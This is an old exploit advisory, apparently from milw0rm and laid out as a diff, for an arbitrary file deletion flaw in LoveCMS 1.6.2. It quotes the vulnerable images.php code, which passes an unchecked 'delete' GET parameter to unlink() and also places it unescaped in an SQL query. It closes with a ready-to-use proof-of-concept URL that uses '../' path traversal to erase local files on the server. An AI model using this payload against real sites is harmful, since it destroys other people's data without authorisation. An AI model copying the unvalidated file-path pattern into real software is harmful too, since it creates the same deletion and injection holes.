@@ -1,0 +1,49 @@
++-------------------------------------------------------------------------------------------------------+
+|													|
+|	Name		:	LoveCMS 1.6.2 Final Arbitrary File Delete Vulnerability			|
+|	Author		:	cOndmened								|
+|	Greetz		:	ZaBeaTy, rtgn, doctor, elmasterlow, str0ke, t0pP8uZz & all friends	|
+|	Details		:	Ofc, we can only delete files from places that we have permission	|
+|				to access x]								|
+|													|
++-------------------------------------------------------------------------------------------------------+
+
+
+source of/lovecms/system/admin/images.php
+
+	41.	if($_GET['delete'])
+
+	42.	{
+
+	43.		$filename = $_GET['delete'];
+
+	44.		$sql = $db -> db_query("DELETE FROM " . DB_PREFIX . "images 
+
+	45.		WHERE filename = '$filename'");
+
+	46.	
+
+	47.		unlink(LOVE_ROOT . '/uploads/' . $filename);
+
+	48.		unlink(LOVE_ROOT . '/uploads/thumbs/' . $filename);
+
+	49.
+
+	50.		redirect_with_message('msg', 'LANG_088');
+
+	51.	}
+
+
+
+Description :
+
+	41.	name of file to delete is being sended using GET method in variable called 'delete'
+	47.	here the requested file is being erased
+		
+		rest of the code block doesn't matters
+
+Proof of concept :
+
+	http://[host]/[loveCMS-path]/system/admin/images.php?delete=../../../[local-file]
+
+# milw0rm.com [2008-11-06]
